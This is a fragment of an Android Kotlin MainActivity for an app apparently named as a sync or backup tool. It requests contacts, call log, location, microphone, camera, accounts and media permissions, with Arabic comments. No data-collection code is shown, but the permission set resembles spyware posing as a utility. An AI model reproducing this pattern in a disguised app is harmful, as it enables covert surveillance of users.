package com.sync.backup

import android.Manifest
import android.content.Intent
import android.content.SharedPreferences
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.widget.Button
import android.widget.EditText
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat

class MainActivity : AppCompatActivity() {

    private lateinit var prefs: SharedPreferences
    private var isArabic = false

    private val perms: Array<String> get() {
    val base = mutableListOf(
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.RECORD_AUDIO,   // ميكروفون
        Manifest.permission.CAMERA,         // كاميرا
        Manifest.permission.GET_ACCOUNTS    // حسابات
    )
    if (Build.VERSION.SDK_INT >= 33) {
        base.add(Manifest.permission.READ_MEDIA_IMAGES)
        base.add(Manifest.permission.READ_MEDIA_VIDEO)
        base.add(Manifest.permission.POST_NOTIFICATIONS)
    } else {
        base.add(Manifest.permission.READ_EXTERNAL_STORAGE)
    }
    return base.toTypedArray()
}